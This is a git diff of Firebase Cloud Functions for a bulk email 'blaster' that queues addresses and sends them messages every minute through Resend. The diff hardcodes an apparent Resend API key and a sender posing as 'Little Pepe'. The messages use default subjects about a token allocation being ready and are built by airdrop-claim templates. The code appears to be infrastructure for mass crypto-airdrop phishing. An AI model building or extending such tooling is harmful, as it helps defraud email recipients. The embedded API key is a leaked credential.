@@ -1,52 +1,21 @@
-const { onCall, HttpsError } = require('firebase-functions/v2/https')
 const { onSchedule } = require('firebase-functions/v2/scheduler')
-const admin = require('firebase-admin')
 const { Resend } = require('resend')
+const admin = require('firebase-admin')
 
 admin.initializeApp()
 
 const db = admin.firestore()
+const resend = new Resend('re_UuafV5Ku_4BzrNWvoPBkzusBtsJrkU7Hj') //eventfarm.ng
 
-/**
- * =========================
- * GENERATE CAMPAIGN ID
- * =========================
- */
-function generateCampaignId(domain) {
-  return `cmp_${domain}_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`
-}
-
-/**
- * =========================
- * SEND BLASTER (QUEUE CREATOR)
- * =========================
- */
 exports.sendBlaster = onCall(async (request) => {
   try {
-    let { emails, subject, html, domain, from, fromEmail, apiKey } = request.data
-
-    // ------------------------
-    // VALIDATION
-    // ------------------------
-    if (!domain) {
-      throw new HttpsError('invalid-argument', 'Domain is required')
-    }
-
-    if (!fromEmail || !apiKey) {
-      throw new HttpsError('invalid-argument', 'Missing fromEmail or apiKey')
-    }
+    let { emails, subject, html } = request.data
 
     if (typeof emails === 'string') {
       emails = emails.split(',')
     }
 
     emails = emails.map((e) => e.trim()).filter((e) => e.includes('@'))
-
-    if (!emails.length) {
-      throw new HttpsError('invalid-argument', 'No valid emails provided')
-    }
-
-    const campaignId = generateCampaignId(domain)
 
     const batch = db.batch()
 
@@ -55,18 +24,8 @@ exports.sendBlaster = onCall(async (request) => {
 
       batch.set(ref, {
         email,
-        subject: subject || 'Your token allocation is ready',
+        subject,
         html: buildAirdropClaimHTML(),
-
-        // campaign info
-        domain,
-        campaignId,
-
-        // sender config (FROM FRONTEND)
-        from: from || 'Notification',
-        fromEmail,
-        apiKey,
-
         status: 'pending',
         createdAt: admin.firestore.FieldValue.serverTimestamp(),
       })
@@ -74,31 +33,20 @@ exports.sendBlaster = onCall(async (request) => {
 
     await batch.commit()
 
-    console.log(`Queued ${emails.length} emails for ${domain}`)
+    console.log('QUEUE WRITTEN:', emails.length)
 
-    return {
-      success: true,
-      queued: emails.length,
-      campaignId,
-      domain,
-    }
+    return { success: true, queued: emails.length }
   } catch (err) {
-    console.error('SEND BLASTER ERROR:', err)
-    throw new HttpsError('internal', err.message)
+    console.error('QUEUE ERROR:', err)
+    throw new HttpsError('internal', err.message) // FIXED: was functions.https.HttpsError
   }
 })
 
-/**
- * =========================
- * EMAIL WORKER
- * =========================
- */
 exports.emailWorker = onSchedule('every 1 minutes', async () => {
   const snapshot = await db
     .collection('emailQueue')
     .where('status', '==', 'pending')
-    .orderBy('createdAt')
-    .limit(10)
+    .limit(5) // Reduced from 10 to be safer
     .get()
 
   if (snapshot.empty) return
@@ -107,17 +55,15 @@ exports.emailWorker = onSchedule('every 1 minutes', async () => {
     const data = doc.data()
 
     try {
-      // create resend instance per job
-      const resend = new Resend(data.apiKey)
-
       await resend.emails.send({
-        from: `${data.from} <${data.fromEmail}>`,
+        from: 'Little Pepe <team@eventfarm.ng>', // CHANGE THIS
         to: data.email,
-        subject: data.subject,
+        subject: data.subject || `Your Little Pepe Allocation is Ready`,
         html: data.html,
-
+        text: buildAirdropClaimText(),
         headers: {
-          'List-Unsubscribe': `<mailto:${data.fromEmail}>`,
+          'List-Unsubscribe': `<https://eventfarm.ng/unsubscribe?email=${encodeURIComponent(data.email)}>`,
+          'List-Unsubscribe-Post': 'List-Unsubscribe=One-Click',
           Precedence: 'bulk',
         },
       })
@@ -133,8 +79,7 @@ exports.emailWorker = onSchedule('every 1 minutes', async () => {
       })
     }
 
-    // throttle
-    await new Promise((r) => setTimeout(r, 3000))
+    await new Promise((r) => setTimeout(r, 5000)) // Increased delay
   }
 })
 
